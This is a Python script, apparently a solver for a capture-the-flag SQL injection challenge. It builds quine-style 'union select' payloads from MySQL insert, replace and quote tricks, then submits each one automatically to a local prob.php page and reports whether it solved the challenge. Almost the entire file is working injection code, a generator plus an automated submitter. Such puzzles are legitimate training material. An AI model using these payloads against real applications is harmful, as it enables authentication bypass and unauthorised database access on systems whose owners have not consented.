#!/usr/bin/env python3
"""
Generate quine candidate payloads automatically.

Pattern A (INSERT):  '<P>insert(@a:=L,p,0,quote(@a))#
Pattern B (REPLACE): '<P>replace(@a:=L_with_marker,marker_arg,quote(@a))#
Pattern C (CONCAT):  '<P>concat(@a:=L,quote(@a))#
Pattern D (LPAD):    Various LPAD-based shapes
"""
import urllib.parse, urllib.request, sys, re

URL = "http://localhost:8080/prob.php"

def submit(payload: str):
    enc = urllib.parse.quote(payload, safe='')
    with urllib.request.urlopen(URL + "?pw=" + enc) as r:
        body = r.read().decode("utf-8", errors="replace")
    pts = re.search(r"points=(\d+)", body)
    solved = "SOLVED" in body
    return solved, len(payload.encode()), int(pts.group(1)) if pts else 0


def make_insert(prefix_inner: str, position: int, length_arg: str, fn: str = "insert", quote_call: str = "quote(@a)") -> str:
    """
    Build:    '<prefix_inner>insert(@a:='<M_escaped>',position,length,quote(@a))#
    where M  = '<prefix_inner>insert(@a:=,position,length,quote(@a))#
    """
    suffix = f",{position},{length_arg},{quote_call})#"
    M = f"'{prefix_inner}{fn}(@a:=" + suffix
    L = "'" + M.replace("\\", "\\\\").replace("'", "\\'") + "'"
    Q = f"'{prefix_inner}{fn}(@a:={L}" + suffix
    return Q


def make_replace(prefix_inner: str, marker_char: str, marker_arg: str, fn: str = "replace") -> str:
    """
    Build:    '<prefix_inner>replace(@a:=<L>,<marker_arg>,quote(@a))#
    where M  = '<prefix_inner>replace(@a:=<marker_char>,<marker_arg>,quote(@a))#
    """
    suffix = f",{marker_arg},quote(@a))#"
    M = f"'{prefix_inner}{fn}(@a:={marker_char}" + suffix
    L = "'" + M.replace("\\", "\\\\").replace("'", "\\'") + "'"
    Q = f"'{prefix_inner}{fn}(@a:={L}" + suffix
    return Q


CANDIDATES = []

# Pattern A: INSERT — vary position, var name
for p in [26]:
    for fn in ["insert"]:
        CANDIDATES.append(("A1", make_insert("union select ", p, "0", fn=fn)))
# Pattern B: REPLACE — vary marker
for marker_arg, marker_char in [
    ("'~'", "~"),
    ("'?'", "?"),
    ("0x7e", "~"),
    ("0xa", "\n"),
    ("0x9", "\t"),
    ("0x1", "\x01"),
    ("0x0", "\x00"),
    ("!0", "1"),       # value 1
    ("!1", "0"),       # value 0
    ("!''", "1"),
    ("0=0", "1"),
    ("0|2", "2"),
    ("9", "9"),        # collision likely
]:
    CANDIDATES.append((f"B-{marker_arg}", make_replace("union select ", marker_char, marker_arg)))

# Pattern A with shorter integer arg
for p_form, p_val_str in [
    ("26", 26),
    ("0x1A", 26),
    ("!0+25", 26),
]:
    # Position must equal byte index of L in M (= 1 + len("'union select insert(@a:=")) = 26
    suffix = f",{p_form},0,quote(@a))#"
    M = "'union select insert(@a:=" + suffix
    L = "'" + M.replace("\\", "\\\\").replace("'", "\\'") + "'"
    Q = "'union select insert(@a:=" + L + suffix
    CANDIDATES.append((f"A-pos={p_form}", Q))

# Pattern A with shorter length arg
for l_form in ["0", "false", "!1", "''"]:
    suffix = f",26,{l_form},quote(@a))#"
    M = "'union select insert(@a:=" + suffix
    L = "'" + M.replace("\\", "\\\\").replace("'", "\\'") + "'"
    Q = "'union select insert(@a:=" + L + suffix
    CANDIDATES.append((f"A-len={l_form}", Q))


def report(label, q):
    if "\n" in q or "\r" in q or "\t" in q or "\x00" in q or "\x01" in q:
        # show urlencoded form for unprintables
        printable = urllib.parse.quote(q)
    else:
        printable = q
    try:
        ok, length, pts = submit(q)
    except Exception as e:
        print(f"[ERR ] {label:20} len={len(q.encode()):3}  err={e}")
        return
    tag = "OK " if ok else "FAIL"
    print(f"[{tag}] {label:24} len={length:3}  pts={pts:>4}  q={printable[:120]}")


for label, q in CANDIDATES:
    report(label, q)
